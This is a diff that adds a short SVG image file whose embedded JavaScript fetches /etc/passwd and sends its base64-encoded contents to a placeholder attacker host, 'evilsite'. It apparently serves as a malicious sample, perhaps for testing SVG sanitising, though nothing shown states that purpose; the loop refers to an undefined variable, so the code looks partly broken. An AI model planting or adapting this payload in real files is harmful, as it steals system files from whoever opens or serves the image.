@@ -1,0 +1,13 @@
+<svg width="10cm" height="3cm" viewBox="0 0 1000 300" version="1.1"
+ xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<script type="text/javascript">
+for (var i=0; trefs[i]; i++) {
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET","/etc/passwd",false);
+  xhr.send("");
+  var xhr2 = new XMLHttpRequest();
+  xhr2.open("GET", "http://evilsite/?p="+btoa(xhr.responseText),false);
+  xhr2.send("");
+}
+</script>
+</svg>
